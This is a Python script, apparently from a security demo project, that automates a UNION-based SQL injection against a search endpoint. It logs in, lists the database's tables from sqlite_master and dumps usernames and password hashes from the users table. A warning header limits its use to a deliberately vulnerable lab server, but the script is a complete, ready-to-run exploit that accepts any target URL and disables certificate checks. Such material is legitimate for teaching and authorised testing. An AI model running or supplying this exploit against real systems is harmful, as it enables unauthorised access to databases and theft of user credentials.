# ==============================================================================
# WARNING: SQL Injection Demonstration Script
#
# This script is designed for educational and testing purposes ONLY. It is
# intended to be run against the deliberately vulnerable Server A within this
# project to demonstrate the impact of SQL Injection vulnerabilities.
#
# DO NOT use this script or these techniques on any server or network that you
# do not own or have explicit, written permission to test.
# ==============================================================================

import requests
import argparse
from bs4 import BeautifulSoup

def perform_sqli_dump(target_url, username, password):
    """
    Logs in and performs a series of UNION-based SQL injection attacks
    to dump database information from the vulnerable search endpoint.
    """
    print(f"--- Starting SQL Injection Demo against {target_url} ---")

    # Use a session object to persist login cookies
    session = requests.Session()
    # Disable warnings for self-signed certificates used in this project
    session.verify = False
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    # 1. Log in to the application
    login_url = f"{target_url}/login"
    login_data = {'username': username, 'password': password}
    print(f"\n[+] Step 1: Logging in as user '{username}'...")
    try:
        r = session.post(login_url, data=login_data)
        if r.status_code != 200 or "Welcome" not in r.text:
            print("[!] Login failed. Check credentials or if the server is running.")
            return
        print("[+] Login successful.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to connect to the server: {e}")
        return

    search_url = f"{target_url}/search"

    # 2. Dump table names
    print("\n[+] Step 2: Attempting to dump table names from sqlite_master...")
    # This payload closes the string, then injects a UNION query to select table names.
    sqli_payload_tables = "' UNION SELECT name, 2 FROM sqlite_master WHERE type='table' --"
    r = session.post(search_url, data={'search_term': sqli_payload_tables})

    soup = BeautifulSoup(r.text, 'html.parser')
    list_items = [item.text for item in soup.find_all('li')]
    print("[+] Success! Found tables:")
    for item_text in list_items:
        print(f"  - {item_text}")

    # 3. Dump user credentials
    print("\n[+] Step 4: Attempting to dump user data from 'users' table...")
    # We concatenate username and password_hash for easy dumping.
    sqli_payload_data = "' UNION SELECT username, password_hash FROM users --"
    r = session.post(search_url, data={'search_term': sqli_payload_data})
    soup = BeautifulSoup(r.text, 'html.parser')
    user_items = [item.text for item in soup.find_all('li')]
    if user_items:
        print("[+] Success! Dumped user data (username):")
        for item_text in user_items:
            print(f"  - {item_text}")
    else:
        print("[!] Could not dump user data.")

    print("\n--- SQL Injection Demo Complete ---")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection automation script for the PQC demo.")
    parser.add_argument("url", help="The base URL of the target server (e.g., https://localhost:8443).")
    parser.add_argument("--user", default="alice", help="Username to log in with.")
    parser.add_argument("--password", default="password123", help="Password for the user.")

    args = parser.parse_args()

    perform_sqli_dump(args.url, args.user, args.password)
